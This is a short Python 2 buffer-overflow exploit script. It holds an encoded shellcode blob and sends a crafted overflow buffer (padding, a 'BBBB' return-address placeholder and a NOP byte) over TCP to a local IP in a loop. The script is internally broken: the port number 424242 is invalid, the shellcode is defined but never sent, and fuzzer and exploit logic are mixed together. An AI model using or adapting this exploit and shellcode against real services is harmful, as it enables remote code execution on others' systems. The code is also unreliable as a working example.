#!/bin/python
import socket,sys
from time import sleep 

shellcode = ("\xfc\xbb\xf8\x8a\x64\x18\xeb\x0c\x5e\x56\x31\x1e\xad\x01\xc3"
"\x85\xc0\x75\xf7\xc3\xe8\xef\xff\xff\xff\x04\x62\xe6\x18\xf4"
"\x73\x87\x91\x11\x42\x87\xc6\x52\xf5\x37\x8c\x36\xfa\xbc\xc0"
"\xa2\x89\xb1\xcc\xc5\x3a\x7f\x2b\xe8\xbb\x2c\x0f\x6b\x38\x2f"
"\x5c\x4b\x01\xe0\x91\x8a\x46\x1d\x5b\xde\x1f\x69\xce\xce\x14"
"\x27\xd3\x65\x66\xa9\x53\x9a\x3f\xc8\x72\x0d\x4b\x93\x54\xac"
"\x98\xaf\xdc\xb6\xfd\x8a\x97\x4d\x35\x60\x26\x87\x07\x89\x85"
"\xe6\xa7\x78\xd7\x2f\x0f\x63\xa2\x59\x73\x1e\xb5\x9e\x09\xc4"
"\x30\x04\xa9\x8f\xe3\xe0\x4b\x43\x75\x63\x47\x28\xf1\x2b\x44"
"\xaf\xd6\x40\x70\x24\xd9\x86\xf0\x7e\xfe\x02\x58\x24\x9f\x13"
"\x04\x8b\xa0\x43\xe7\x74\x05\x08\x0a\x60\x34\x53\x43\x45\x75"
"\x6b\x93\xc1\x0e\x18\xa1\x4e\xa5\xb6\x89\x07\x63\x41\xed\x3d"
"\xd3\xdd\x10\xbe\x24\xf4\xd6\xea\x74\x6e\xfe\x92\x1e\x6e\xff"
"\x46\xb0\x3e\xaf\x38\x71\xee\x0f\xe9\x19\xe4\x9f\xd6\x3a\x07"
"\x4a\x7f\xd0\xf2\x1d\x8a\x2c\xfc\xbb\xe2\x2c\xfc\x52\xaf\xb9"
"\x1a\x3e\x5f\xec\xb5\xd7\xc6\xb5\x4d\x49\x06\x60\x28\x49\x8c"
"\x87\xcd\x04\x65\xed\xdd\xf1\x85\xb8\xbf\x54\x99\x16\xd7\x3b"
"\x08\xfd\x27\x35\x31\xaa\x70\x12\x87\xa3\x14\x8e\xbe\x1d\x0a"
"\x53\x26\x65\x8e\x88\x9b\x68\x0f\x5c\xa7\x4e\x1f\x98\x28\xcb"
"\x4b\x74\x7f\x85\x25\x32\x29\x67\x9f\xec\x86\x21\x77\x68\xe5"
"\xf1\x01\x75\x20\x84\xed\xc4\x9d\xd1\x12\xe8\x49\xd6\x6b\x14"
"\xea\x19\xa6\x9c\x0a\xf8\x62\xe9\xa2\xa5\xe7\x50\xaf\x55\xd2"
"\x97\xd6\xd5\xd6\x67\x2d\xc5\x93\x62\x69\x41\x48\x1f\xe2\x24"
"\x6e\x8c\x03\x6d\x6e\x32\xfc\x8e")

buffer = "A" * 146 + "BBBB" +"\x90" 

while True:

    try:
        s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
        s.connect(('192.168.0.10', 424242))

        s.send(( buffer))
        s.close()
        print "sending %s bytes...." % str(len(buffer))

    except:

        print "Fuzzing crashed at %s bytes..." % str(len(buffer))
        sys.exit()



